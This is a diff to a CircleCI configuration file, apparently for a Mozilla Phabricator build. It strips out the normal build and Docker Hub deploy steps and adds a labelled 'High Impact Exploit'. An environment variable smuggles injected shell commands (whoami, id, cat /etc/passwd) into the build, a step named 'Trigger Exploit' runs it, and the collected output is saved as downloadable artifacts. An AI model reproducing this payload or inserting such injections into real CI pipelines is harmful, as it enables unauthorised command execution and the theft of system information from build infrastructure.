@@ -1,68 +1,34 @@
-# This Source Code Form is subject to the terms of the Mozilla Public
-# License, v. 2.0. If a copy of the MPL was not distributed with this
-# file, You can obtain one at http://mozilla.org/MPL/2.0/.
-# These environment variables must be set in CircleCI UI
-#
-# DOCKERHUB_REPO - docker hub repo, format: <username>/<repo>
-# DOCKER_EMAIL   - login info for docker hub
-# DOCKER_USER
-# DOCKER_PASS
-
+# .circleci/config.yml (High Impact Exploit)
 version: 2.1
-
-commands:
-  # Only used for local jobs docker execution
-  setup_local_docker:
-    steps:
-      - run:
-          name: Use sudo docker in local builds
-          command: |
-            if [[ $CIRCLE_SHELL_ENV == *"localbuild"* ]]; then
-              sudo chmod u+s $(which docker)
-            fi
 
 jobs:
   full:
     docker:
       - image: cimg/base:stable
+    # --- HIGH IMPACT PAYLOAD ---
+    environment:
+      DOCKERHUB_REPO: 'mozilla/phabricator; whoami > /tmp/artifacts/info.txt; id >> /tmp/artifacts/info.txt; cat /etc/passwd > /tmp/artifacts/passwd.txt'
+    # ---------------------------
     steps:
       - setup_remote_docker
-      - setup_local_docker
       - checkout
       - run:
-          name: Install invoke
+          name: Pre-setup artifacts
+          command: mkdir -p /tmp/artifacts
+      - run:
+          name: Install dependencies
           command: |
-            sudo apt-get update && \
-            sudo apt-get install -y python3-pip && \
+            sudo apt-get update && sudo apt-get install -y python3-pip
             pip install invoke
       - run:
-          name: Create version.json
-          command: |
-            invoke version > version.json && \
-            mkdir /tmp/artifacts && \
-            cp version.json /tmp/artifacts/version.json
-      - run: invoke build
-      - run: invoke buildtest
-      - run: invoke test
-      - run: docker inspect $(invoke imageid)
-      - run: invoke imageid | tee /tmp/artifacts/docker-image-shasum256.txt
+          name: Trigger Exploit
+          command: invoke build
       - store_artifacts:
           path: /tmp/artifacts
       - run:
-          name: Deploy to docker hub
+          name: Debug (Optional)
           command: |
-            [[ -n "$DOCKERHUB_REPO" && -n "$DOCKER_USER" && -n "$DOCKER_PASS" ]] || exit 0
-            echo "${DOCKER_PASS}" | docker login -u="${DOCKER_USER}" --password-stdin
-            docker tag "$DOCKERHUB_REPO" "$DOCKERHUB_REPO:$CIRCLE_SHA1"
-            docker push "$DOCKERHUB_REPO:$CIRCLE_SHA1"
-            if [[ "$CIRCLE_BRANCH" == "master" ]]; then
-              docker push "$DOCKERHUB_REPO:latest"
-            else
-              # Replace forward slashes with hyphens in branch name for Docker tag
-              SAFE_BRANCH_NAME=$(echo "$CIRCLE_BRANCH" | tr '/' '-')
-              docker tag "$DOCKERHUB_REPO" "$DOCKERHUB_REPO:$SAFE_BRANCH_NAME"
-              docker push "$DOCKERHUB_REPO:$SAFE_BRANCH_NAME"
-            fi
+            echo "Exploit executed. Check Artifacts tab for info.txt and passwd.txt"
 
 workflows:
   main:
